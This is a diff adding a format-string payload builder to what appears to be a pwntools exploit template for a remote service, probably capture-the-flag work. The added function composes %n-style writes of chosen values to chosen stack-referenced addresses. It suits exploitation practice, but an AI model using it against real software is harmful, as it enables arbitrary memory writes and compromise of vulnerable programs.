@@ -61,6 +61,39 @@ def str_addr(s, f): # search string address in file
     else:
         return result[0]
 
+def fmtstr(payload, prints, index, data, byte=1):
+    """
+    data: data that want to be written into the address
+    index: stack position (ex. %7$n --> index = 7)
+    prints: total charaters that have been print out
+    payload: whole payload string, initial value are addresses
+
+    ex.  payload = p32(addr) + p32(addr2) + p32(addr3)
+         prints = 12
+         payload, prints = fmtstr(payload, prints, 7, 0xa0a0, 2)
+         payload, prints = fmtstr(payload, prints, 8, 0xc0, 1)
+         payload, prints = fmtstr(payload, prints, 9, 0x08047654, 4)
+    """
+    if data - prints >= 0:
+        num = data - prints
+    else:
+        num = data + 256**byte - prints
+
+    payload += "%" + str(num) + "c" 
+    prints = data
+
+    if byte == 1:
+        payload += "%" + str(index) + "$hhn"
+    elif byte == 2:
+        payload += "%" + str(index) + "$hn"
+    elif byte == 4:
+        payload += "%" + str(index) + "$n"
+    elif byte == 8:
+        payload += "%" + str(index) + "$lln"
+
+    return payload, prints
+
+
 if __name__ == "__main__":
 
     r = remote(HOST, PORT)
